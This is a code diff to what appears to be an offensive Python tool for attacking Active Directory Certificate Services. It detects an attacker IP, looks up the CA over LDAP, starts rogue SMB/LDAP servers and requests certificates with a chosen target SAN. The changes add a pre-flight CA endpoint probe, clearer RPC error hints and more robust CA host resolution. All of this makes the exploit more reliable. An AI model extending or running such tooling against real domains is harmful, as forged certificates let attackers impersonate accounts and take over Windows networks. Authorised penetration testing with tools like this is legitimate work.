@@ -937,7 +937,11 @@ def request_cert(ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
             _debug("CA RPC attempt 2: connected and bound to ICPR")
         except Exception as e:
             _debug_exception("CA RPC attempt 2", e)
-            raise RuntimeError(f"Cannot connect to CA RPC: {e}")
+            hint = ""
+            if "ept_s_not_registered" in str(e) or "0x16c9a0d6" in str(e).lower():
+                hint = (" — ept_s_not_registered means no AD CS (ICPR) endpoint is registered "
+                        "on that host: wrong --ca-ip, or the CertSvc service is stopped there")
+            raise RuntimeError(f"Cannot connect to CA RPC: {e}{hint}")
     _debug("CA RPC: submitting CertServerRequest")
     resp = dce.request(req, checkError=False)
     disp = resp["pdwDisposition"]
@@ -1042,6 +1046,32 @@ def port_ok(h, p, t=1.0):
         return False
 
 
+def probe_ca(ca_ip, ca_name, domain, dc_ip):
+    """Pre-flight: does the CA actually serve the ICPR (cert) interface?
+    Catches wrong --ca-ip / stopped CertSvc before the rogue servers start,
+    where the failure would otherwise surface ~15s later as a confusing
+    ept_s_not_registered / named-pipe error."""
+    try:
+        ep = epm.hept_map(ca_ip, MSRPC_UUID_ICPR, protocol="ncacn_ip_tcp")
+        _debug(f"CA probe: ICPR endpoint found via EPM: {ep}")
+        return
+    except Exception as exc:
+        err = str(exc)
+        if "ept_s_not_registered" in err or "0x16c9a0d6" in err.lower():
+            print(f"[!] CA probe failed: host {ca_ip} has no AD CS (ICPR) endpoint registered")
+            print(f"    - Is '{ca_name}' actually hosted on {ca_ip}? (check --ca-ip)")
+            print("    - Or is the CertSvc ('certsvc') service stopped on that host?")
+            print("    Find real CAs with: certutil -config - -ping  (on any domain host)")
+            sys.exit(1)
+        elif "socket" in err.lower() or "timed out" in err.lower() or "refused" in err.lower():
+            print(f"[!] CA probe failed: cannot reach endpoint mapper (TCP/135) on {ca_ip}")
+            print("    - Wrong --ca-ip, or host firewall blocks RPC")
+            sys.exit(1)
+        else:
+            _debug_exception("CA probe (non-fatal)", exc)
+            print(f"[!] CA probe inconclusive: {err} — continuing, request may fail")
+
+
 def check_prerequisites():
     """Fail fast with an actionable fix instead of dying mid-exploit.
 
@@ -1133,15 +1163,30 @@ def main():
     if not atk_ip: print("[!] Cannot detect attacker IP (use --listener)"); sys.exit(1)
 
     ca_name = args.ca
+    ca_dns = None
     if not ca_name:
         e = ldap_query_one(conn, f"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,{dn}",
                            "(objectClass=pKIEnrollmentService)", ["cn", "dNSHostName"])
         if e:
             ca_name = str(e.get("cn", ""))
-            if not ca_ip and e.get("dNSHostName"):
-                ca_ip = dns_resolve(str(e["dNSHostName"]), dc_ip)
+            ca_dns = str(e.get("dNSHostName", "")) or None
     if not ca_name: print("[!] Cannot detect CA name (use --ca)"); sys.exit(1)
-    if not ca_ip: ca_ip = dc_ip
+    if not ca_ip and ca_dns:
+        ca_ip = dns_resolve(ca_dns, dc_ip)
+        if ca_ip:
+            print(f"[*] CA '{ca_name}' resolved via DC DNS: {ca_dns} -> {ca_ip}")
+        else:
+            print(f"[!] Could not resolve CA host '{ca_dns}' via the DC's DNS")
+            print("    Pass --ca-ip <CA IP> explicitly and rerun"); sys.exit(1)
+    if not ca_ip:
+        ca_ip = dc_ip
+        print(f"[*] No --ca-ip given: assuming CA is on the DC ({dc_ip})")
+        print("    If the CA lives on another host, rerun with --ca-ip <CA IP>")
+
+    # Pre-flight CA check before starting rogue servers: fail fast (~1s)
+    # instead of failing after SMB/LDAP startup + EPM queries (~15s in).
+    print(f"[*] Probing CA {ca_name} at {ca_ip} (ICPR endpoint)")
+    probe_ca(ca_ip, ca_name, domain, dc_ip)
 
     target_name = args.target_san
     if not target_name:
